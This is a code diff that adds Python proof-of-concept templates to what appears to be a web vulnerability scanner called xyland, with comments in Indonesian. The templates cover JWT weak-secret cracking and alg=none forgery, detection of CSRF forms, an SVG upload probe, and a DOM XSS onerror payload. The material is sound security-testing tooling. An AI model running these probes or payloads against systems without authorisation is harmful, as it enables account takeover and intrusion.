@@ -341,6 +341,180 @@ def main():
 if __name__ == "__main__":
     raise SystemExit(main())
 `, targetURL, targetURL), true
+	case "jwt":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - JWT (dihasilkan xyland). Token dibaca dari ENV (tidak disimpan di file):
+  XYLAND_JWT="eyJ..." python3 poc.py
+Dua uji: (1) crack signature HS* terhadap daftar secret umum (offline),
+(2) token alg=none dibandingkan dengan token valid & tanpa auth.
+Target : %s
+Exit   : 0=confirmed (secret ketemu / none diterima) | 2=false positive | 3=inconclusive
+"""
+import os, json, base64, hmac, hashlib, urllib.request, urllib.error
+
+URL = %q
+SECRETS = ["secret","secretkey","secret123","key","password","changeme","jwtsecret","jwt-secret","your-secret-key","mysecret","supersecret","s3cret","test","admin","default","keyboard cat","qwerty","123456","please-change-me","secret-key"]
+
+def b64d(s):
+    return base64.urlsafe_b64decode(s + "=" * (-len(s) %% 4))
+
+def b64e(b):
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+def fetch(u, tok=None):
+    try:
+        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
+        if tok: req.add_header("Authorization", "Bearer " + tok)
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return r.status, r.read().decode("utf-8", "ignore")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "ignore")
+    except Exception:
+        return None, ""
+
+def main():
+    tok = os.environ.get("XYLAND_JWT", "")
+    parts = tok.split(".")
+    if len(parts) != 3:
+        print("VERDICT: INCONCLUSIVE (set XYLAND_JWT dengan token asli)"); return 3
+    hdr = json.loads(b64d(parts[0]))
+    alg = hdr.get("alg", "")
+    if alg.startswith("HS"):
+        hf = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
+        sig = b64d(parts[2]); msg = (parts[0] + "." + parts[1]).encode()
+        for s in SECRETS:
+            if hmac.new(s.encode(), msg, hf).digest() == sig:
+                print("VERDICT: CONFIRMED (secret HMAC lemah:", s, ")"); return 0
+    # uji alg=none
+    nh = b64e(json.dumps({"alg": "none", "typ": hdr.get("typ", "JWT")}).encode())
+    none_tok = nh + "." + parts[1] + "."
+    sb, base = fetch(URL)
+    sv, valid = fetch(URL, tok)
+    sn, none = fetch(URL, none_tok)
+    if None in (sb, sv, sn):
+        print("VERDICT: INCONCLUSIVE (jaringan)"); return 3
+    if sn == 200 and sv == 200 and none.strip() == valid.strip() and none.strip() != base.strip():
+        print("VERDICT: CONFIRMED (alg=none diterima)"); return 0
+    print("VERDICT: FALSE_POSITIVE (kedua uji negatif)"); return 2
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
+
+	case "csrf":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - CSRF (dihasilkan xyland) - inventaris pasif: form POST tanpa token anti-CSRF.
+CATATAN: bukti pasif = verdict LIKELY; eksploitasi penuh butuh halaman penyerang
+lintas origin + sesi korban, di luar cakupan PoC read-only ini.
+Target : %s
+Exit   : 0=form rentan ditemukan (likely) | 2=semua form ber-token | 3=inconclusive
+"""
+import urllib.request, html.parser
+
+URL = %q
+HINTS = ("csrf", "token", "authenticity", "_nonce", "verification")
+
+class FP(html.parser.HTMLParser):
+    def __init__(self):
+        super().__init__(); self.forms = []; self.cur = None
+    def handle_starttag(self, tag, attrs):
+        a = dict(attrs)
+        if tag == "form": self.cur = {"method": a.get("method", "get").upper(), "action": a.get("action", ""), "names": []}
+        elif tag in ("input", "textarea", "select") and self.cur is not None and a.get("name"):
+            self.cur["names"].append(a["name"].lower())
+    def handle_endtag(self, tag):
+        if tag == "form" and self.cur is not None:
+            self.forms.append(self.cur); self.cur = None
+
+def main():
+    try:
+        req = urllib.request.Request(URL, headers={"User-Agent": "xyland-poc"})
+        body = urllib.request.urlopen(req, timeout=10).read().decode("utf-8", "ignore")
+    except Exception:
+        print("VERDICT: INCONCLUSIVE"); return 3
+    p = FP(); p.feed(body)
+    bad = [f for f in p.forms if f["method"] == "POST" and not any(h in n for n in f["names"] for h in HINTS)]
+    if bad:
+        print("VERDICT: LIKELY (form POST tanpa token:", [f["action"] for f in bad], ")"); return 0
+    print("VERDICT: FALSE_POSITIVE"); return 2
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
+
+	case "file-upload":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - File Upload (dihasilkan xyland): unggah SVG bermarker unik, lalu buktikan
+file tersaji kembali dari origin target. Jalankan dari halaman yang memuat form.
+Target : %s
+Exit   : 0=confirmed tersaji aktif | 2=tidak tersaji | 3=inconclusive
+"""
+import urllib.request, urllib.parse, uuid
+
+PAGE = %q
+MARKER = "XYLAND-UPLOAD-MARKER-7F3A"
+NAME = "xyland-test.svg"
+SVG = '<svg xmlns="http://www.w3.org/2000/svg"><text x="5" y="20">' + MARKER + "</text></svg>"
+
+def get(u):
+    try:
+        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return r.status, r.headers.get_content_type(), r.read().decode("utf-8", "ignore")
+    except Exception:
+        return None, "", ""
+
+def main():
+    # form upload diasumsikan POST multipart ke halaman yang sama (pola umum lab/CMS)
+    boundary = "----xyland" + uuid.uuid4().hex
+    body = ("--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + NAME + "\"\r\n"
+            "Content-Type: image/svg+xml\r\n\r\n" + SVG + "\r\n--" + boundary + "--\r\n").encode()
+    try:
+        req = urllib.request.Request(PAGE, data=body, headers={"Content-Type": "multipart/form-data; boundary=" + boundary, "User-Agent": "xyland-poc"})
+        urllib.request.urlopen(req, timeout=10).read()
+    except Exception:
+        print("VERDICT: INCONCLUSIVE (submit gagal — sesuaikan action/field dari temuan)"); return 3
+    base = urllib.parse.urlparse(PAGE)
+    root = base.scheme + "://" + base.netloc
+    for pref in ("/uploads/", "/upload/", "/files/", "/media/"):
+        st, ct, b = get(root + pref + NAME)
+        if MARKER in b:
+            if "svg" in ct or "html" in ct:
+                print("VERDICT: CONFIRMED (tersaji aktif di", root + pref + NAME, ")"); return 0
+            print("VERDICT: LIKELY (tersimpan & publik, content-type netral)"); return 0
+    print("VERDICT: FALSE_POSITIVE (lokasi penyajian tidak ditemukan)"); return 2
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
+
+	case "xss-dom":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - DOM XSS (dihasilkan xyland). Verifikasi kelas ini memerlukan browser:
+buka URL berikut di browser — bila halaman rentan, payload mengeksekusi dan
+memasang atribut data-xyland="pwned" pada <body> (cek via DevTools console:
+document.body.getAttribute('data-xyland')). xyland sendiri memverifikasi ini
+dengan executor browser (rod) saat scan.
+Target : %s
+Exit   : 3=inconclusive (butuh browser, sesuai kontrak)
+"""
+import urllib.parse
+
+URL = %q
+PAYLOAD = "<img src=x onerror=document.body.setAttribute('data-xyland','pwned')>"
+
+def main():
+    print("Buka di browser:", URL.split("#")[0] + "#" + urllib.parse.quote(PAYLOAD, safe="/"))
+    print("VERDICT: INCONCLUSIVE (verifikasi DOM butuh browser)"); return 3
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
+
 	}
 	return "", false
 }
